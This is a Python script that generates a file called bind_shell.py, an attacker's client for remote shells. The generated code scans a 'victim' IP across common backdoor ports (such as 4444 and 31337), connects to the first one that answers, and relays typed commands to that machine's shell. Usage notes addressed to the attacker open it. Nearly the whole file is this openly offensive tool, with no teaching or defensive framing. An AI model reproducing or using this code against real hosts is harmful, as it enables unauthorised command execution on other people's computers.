import os
from time import sleep
from termcolor import colored


def generate_payload():
    bind_shell_code = """
'''
How to use this payload:
1) Run this file
2) Wait for connecting to victim
3) Write commands!)
'''
import sys
import socket
from time import sleep
from termcolor import colored

shell_ports = (22, 23, 1337, 4443, 4444, 5555, 9999, 31337)

def scan_shell_ports(targetIP):
    available_shell_port = None

    for port in shell_ports:
        sock = socket.socket()
        sock.settimeout(0.02)
        try:
            sock.connect((targetIP, port))
            available_shell_port = port
            break
        except:
            pass
        finally:
            sock.close()

    if available_shell_port:
        return available_shell_port
    else:
        return None
def launch_shell(targetIP, port):
    print(colored(f"[*] Connecting to {targetIP}...", "yellow"))
    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect((targetIP, port))
        sleep(1.5)
        print(colored(f"[+] Connected to {targetIP}:{port}!", "green"))
        while True:
            cmd = input(colored(f"{targetIP}㉿{port}--[Command]:~[ ", "cyan"))
            if cmd in ["exit", "quit"]:
                break
            sock.send(cmd.encode())
            response = sock.recv(4096).decode(errors="ignore")
            print(response)
    except:
        print(colored("[-] Connection failed", "red"))
    finally:
        sock.close()

if len(sys.argv) > 1:
    target = sys.argv[1]
else:
    target = input(colored("[*] Enter the target IP: ", "yellow"))
port = scan_shell_ports(target)
launch_shell(target, port)
"""
    print(colored("[*] Generating bind-shell payload...", "yellow"))
    sleep(1)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, "bind_shell.py")
    with open(file_path, "w", encoding="utf-8") as bind_shell:
        bind_shell.writelines(bind_shell_code)
        print(colored("[+] Payload was generated!", "green"))
